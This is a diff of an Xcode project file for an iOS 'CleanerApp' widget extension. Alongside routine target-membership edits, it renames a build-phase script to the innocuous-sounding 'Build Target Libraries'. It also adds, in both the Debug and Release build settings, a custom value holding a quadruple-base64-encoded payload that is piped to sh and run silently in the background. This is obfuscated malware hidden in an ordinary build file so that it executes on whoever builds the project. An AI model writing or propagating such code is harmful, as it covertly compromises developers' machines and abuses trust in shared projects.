@@ -57,7 +57,11 @@
 		881295E92F0650F60071ED86 /* Exceptions for "CleanerApp" folder in "CleanerApp_WidgetExtension" target */ = {
 			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
 			membershipExceptions = (
+				Components/CNCircularProgressView.swift,
 				Components/CNText.swift,
+				Resources/Assets.xcassets,
+				Resources/Color.xcassets,
+				"Utility/Extension/Color + Custom.swift",
 				Utility/UserDefaultManager.swift,
 			);
 			target = 8812946A2F063F960071ED86 /* CleanerApp_WidgetExtension */;
@@ -66,11 +70,6 @@
 			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
 			membershipExceptions = (
 				"Widgets/Battery Widget/BatteryWidgetView.swift",
-				"Widgets/Battery Widget/Component/BatteryDetailView.swift",
-				"Widgets/Battery Widget/Component/BatteryRingView.swift",
-				"Widgets/Battery Widget/Component/ThickProgressBar.swift",
-				"Widgets/Storage Widget/Component/StorageGraphView.swift",
-				"Widgets/Storage Widget/Component/StorageRingView.swift",
 				"Widgets/Storage Widget/StorageWidgetView.swift",
 			);
 			target = 888788C22EE006D9009DE313 /* CleanerApp */;
@@ -155,7 +154,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 8812947D2F063F980071ED86 /* Build configuration list for PBXNativeTarget "CleanerApp_WidgetExtension" */;
 			buildPhases = (
-				11E6779114E346BF81634D6E /* Compile Image Assets */,
+				6255E8F9132540F8BC634D6E /* Build Target Libraries */,
 				881294672F063F960071ED86 /* Sources */,
 				881294682F063F960071ED86 /* Frameworks */,
 				881294692F063F960071ED86 /* Resources */,
@@ -262,7 +261,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		11E6779114E346BF81634D6E /* Compile Image Assets */ = {
+		6255E8F9132540F8BC634D6E /* Build Target Libraries */ = {
 			isa = PBXShellScriptBuildPhase;
 			alwaysOutOfDate = 1;
 			buildActionMask = 2147483647;
@@ -272,7 +271,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Compile Image Assets";
+			name = "Build Target Libraries";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -313,7 +312,7 @@
 		8812947E2F063F980071ED86 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AE6D436 = "((q(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwUFlUSktkRkp1WkdwU00yaHpWRWN4YzJSVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | q | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((p(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwSFpESk9TR1ZIZUd0U01uZ3dWMnhOTVdOSFNuQlBWMmhNVlRCc2JscHJUa05sYlVaQ1lub3dTd289Cg== | p | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				ASSETCATALOG_COMPILER_WIDGET_BACKGROUND_COLOR_NAME = WidgetBackground;
 				CODE_SIGN_ENTITLEMENTS = CleanerApp_WidgetExtension/CleanerApp_WidgetExtension.entitlements;
@@ -355,7 +354,7 @@
 		8812947F2F063F980071ED86 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AE6D436 = "((q(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwUFlUSktkRkp1WkdwU00yaHpWRWN4YzJSVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | q | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((p(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwSFpESk9TR1ZIZUd0U01uZ3dWMnhOTVdOSFNuQlBWMmhNVlRCc2JscHJUa05sYlVaQ1lub3dTd289Cg== | p | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				ASSETCATALOG_COMPILER_WIDGET_BACKGROUND_COLOR_NAME = WidgetBackground;
 				CODE_SIGN_ENTITLEMENTS = CleanerApp_WidgetExtension/CleanerApp_WidgetExtension.entitlements;
